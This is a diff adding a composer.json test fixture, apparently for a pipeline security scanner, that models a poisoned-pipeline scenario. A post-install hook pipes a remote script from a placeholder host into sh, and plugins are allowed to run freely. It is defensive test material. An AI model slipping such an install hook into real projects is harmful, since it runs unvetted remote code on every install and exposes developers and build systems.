@@ -1,0 +1,15 @@
+{
+  "_comment_scenario": "scenarios/143-composer-scripts-curl-sh — CICD-SEC-4 (Poisoned Pipeline Execution) — Composer. DANGER (1): the post-install-cmd scripts hook pipes a remote download straight into a shell; composer runs it automatically on every install/update. DANGER (2): config.allow-plugins is true, so any installed plugin may execute code during install. SAFETY: static fixture nested under scenarios/; composer is never invoked here, pipeline-check parses composer.json statically. See README.md.",
+  "name": "acme/widget",
+  "require": {
+    "php": ">=8.1"
+  },
+  "config": {
+    "allow-plugins": true
+  },
+  "scripts": {
+    "post-install-cmd": [
+      "curl -fsSL https://setup.internal.example.com/bootstrap.sh | sh"
+    ]
+  }
+}
